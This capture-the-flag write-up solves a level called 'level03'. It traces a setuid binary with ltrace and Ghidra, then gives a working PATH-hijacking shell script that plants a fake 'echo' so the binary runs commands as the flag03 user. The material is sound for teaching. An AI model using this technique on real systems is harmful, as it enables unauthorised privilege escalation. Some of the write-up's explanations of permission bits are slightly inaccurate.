# level03

## Scanning

**1. Who are we ?** 👀
```sh
$ id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

## Solution

`/home/user/level03/level03` seems suspicious. It is a binary executable. And executing it confirms this:  
```
$ ./level03 
Exploit me
```
### Script Privileges

We determined it is a prime candidate for privilege escalation because:
- It is owned by `flag03` (our target).
- The group owner is `level03` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, for the group, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level03`, the privilege state is as follows:  
- Real UID: `level03`
- Real GUID: `level03`
- Effective UID: `flag03`
- Effective GUID: `level03`

### Script content

We used different tools to identify potential vulnerabilities:  
- [`ltrace`](https://man7.org/linux/man-pages/man1/ltrace.1.html) to identify library calls.
- [`Ghidra`](https://github.com/nationalsecurityagency/ghidra) to disassemble and analyze the source code.

```sh
$ ltrace ~/level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                            = 2003
geteuid()                                                                                                            = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 0
```

Ghidra output:
```c
int	main(int argc, char **argv, char **envp)
{
	__gid_t	__rgid;
	__uid_t	__ruid;
	int		iVarl;

	/*
	 * Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
	 * Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28]
	*/

	__rgid = getegid();
	__ruid = geteuid();
	iVarl = system("/usr/bin/env echo Exploit me");
	return iVarl;
}
```

### Vulnerability

The binary uses `system()` to execute `/usr/bin/env echo Exploit me`.

Because the binary runs with `flag03` privileges, the shell spawned by `system()` will inherit those permissions.

Also, the command uses `/usr/bin/env` to locate the `echo` command. This means that instead of calling the builtin `echo` command it searches the `$path` environment variable to find an external `echo` command.
```sh
$ type echo
echo is a shell builtin
$ type echo
echo is /usr/bin/echo
```

We can exploit this to hijack the called `echo` command with our own script and take advantage of the elevated privilages it would be called with.

```sh
fakepath_dir="/tmp/fakepath"
mkdir -p "$fakepath_dir";

echo "getflag" > "$fakepath_dir/echo";
chmod +x "$fakepath_dir/echo";

export PATH="$fakepath_dir:$PATH";
/home/user/level03/level03

rm -r $fakepath_dir
```

And there is the flag !